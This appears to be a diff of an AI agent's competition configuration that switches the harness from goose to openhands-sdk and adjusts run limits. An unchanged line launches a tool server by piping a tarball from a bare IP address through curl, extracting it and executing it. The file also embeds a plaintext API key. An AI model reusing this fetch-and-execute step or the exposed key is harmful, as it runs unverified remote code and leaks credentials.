@@ -14,9 +14,9 @@ competition: "grounded-reasoning"
 
 agent:
   type: "harness"
-  harness_name: "goose"
+  harness_name: "openhands-sdk"
   model: "openrouter/minimax/minimax-m2.5"
-  prompt_template_path: "prompts/goose_instructions.md"
+  prompt_template_path: "prompts/system.j2"
 
   mcp_servers:
     - name: officeqa-arena
@@ -25,7 +25,8 @@ agent:
       args: ["-c", "curl -fsSL http://147.182.206.223:9090/mcp_bundle.tar.gz | tar xz -C /tmp 2>/dev/null && chmod +x /tmp/run_mcp.sh && exec /tmp/run_mcp.sh"]
 
   config:
-    max_turns: 25
+    temperature: 0.0
+    max_iterations: 30
 
   env:
     LLM_API_KEY: "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"
@@ -33,8 +34,8 @@ agent:
     OFFICEQA_SQLITE_DB: "/app/corpus/officeqa_enriched.sqlite3"
     OPENHANDS_SUPPRESS_BANNER: "1"
     TELEMETRY_URL: "http://147.182.206.223:8080"
-    TELEMETRY_SOURCE: "goose"
+    TELEMETRY_SOURCE: "openhands"
     PYTHONPATH: "/installed-agent/overrides"
 
 environment:
-  timeout_per_task: 300
+  timeout_per_task: 600
